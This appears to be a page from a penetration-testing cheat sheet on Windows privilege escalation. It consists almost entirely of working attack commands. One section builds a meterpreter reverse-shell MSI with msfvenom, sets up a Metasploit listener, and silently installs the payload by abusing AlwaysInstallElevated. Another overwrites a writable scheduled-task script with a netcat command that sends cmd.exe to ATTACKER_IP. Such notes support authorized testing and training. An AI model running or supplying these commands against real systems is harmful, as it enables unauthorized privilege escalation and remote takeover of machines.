# Other quick wins

### AlwaysInstallElevated

{% code overflow="wrap" %}
```bash
# Check if both registries are set to 0x1 
CMD> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
CMD> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
# Revese shell with msi 
Kali> msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4567 -f msi > /root/Desktop/1.msi

# CMD> upload /root/Desktop/1.msi .

Kali> msf > use exploit/multi/handler
Kali> msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
Kali> msf exploit(handler) > set lhost 192.168.1.120
Kali> msf exploit(handler) > set lport 4567
Kali> msf exploit(handler) > exploit

CMD> msiexec /quiet /qn /i 1.msi
```
{% endcode %}

### Scheduled Tasks

{% code overflow="wrap" %}
```bash
CMD> schtasks /query /tn vulntask /fo list /v
CMD> icacls c:\tasks\schtask.bat 
CMD> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
Kali> nc -nlvp 4444
CMD> schtasks /run /tn vulntask
```
{% endcode %}
